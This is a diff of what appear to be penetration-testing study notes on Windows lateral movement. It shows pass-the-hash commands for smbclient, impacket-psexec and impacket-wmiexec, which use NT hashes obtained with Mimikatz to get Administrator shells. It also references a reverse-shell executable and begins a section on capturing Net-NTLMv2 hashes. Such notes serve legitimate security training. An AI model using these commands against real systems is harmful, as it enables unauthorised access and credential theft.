@@ -282,8 +282,8 @@ C:\Users\Public\reverseshell.exe
 		- `smbclient \\\\{IP}\\{SMB_share_endpoint} -U Administrator --pw-nt-hash {hash_from_Mimikatz}`
 	- Example2 - getting a shell as an Administrator with `psexec.py`
 		- Searches for a writeable share and uploads an exe to it, registers exe as a Windows service and starts it
-		- `impacket-psexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}` and
-		- `impacket-wmiexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}`
+		- `impacket-psexec -hashes :{hash} {DOMAIN}/{user}@{IP}` and
+		- `impacket-wmiexec -hashes :{hash} {DOMAIN}/{user}@{IP}`
 - Cracking Net-NTLMv2
 	- Useful when we are an unprivileged user
 	- We have the target start authentication against a machine we own, and capture the hash used during the authentication process
